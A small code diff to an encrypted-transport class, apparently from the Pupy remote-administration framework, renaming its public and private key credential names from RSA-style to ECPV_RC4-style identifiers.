@@ -27,7 +27,7 @@ class EC4Transport(BasePupyTransport):
     privkey = None
     pubkey  = None
 
-    credentials = ['SIMPLE_RSA_PRIV_KEY', 'SIMPLE_RSA_PUB_KEY']
+    credentials = ['ECPV_RC4_PRIVATE_KEY', 'ECPV_RC4_PUBLIC_KEY']
 
     def __init__(self, *args, **kwargs):
         super(EC4Transport, self).__init__(*args, **kwargs)
@@ -38,8 +38,8 @@ class EC4Transport(BasePupyTransport):
         privkey = self.privkey
 
         if credentials:
-            pubkey = credentials.get('SIMPLE_RSA_PUB_KEY', self.pubkey)
-            privkey = credentials.get('SIMPLE_RSA_PRIV_KEY', self.privkey)
+            pubkey = credentials.get('ECPV_RC4_PUBLIC_KEY', self.pubkey)
+            privkey = credentials.get('ECPV_RC4_PRIVATE_KEY', self.privkey)
 
         if not pubkey and not privkey:
             raise ValueError('Public or Private key required for EC4')
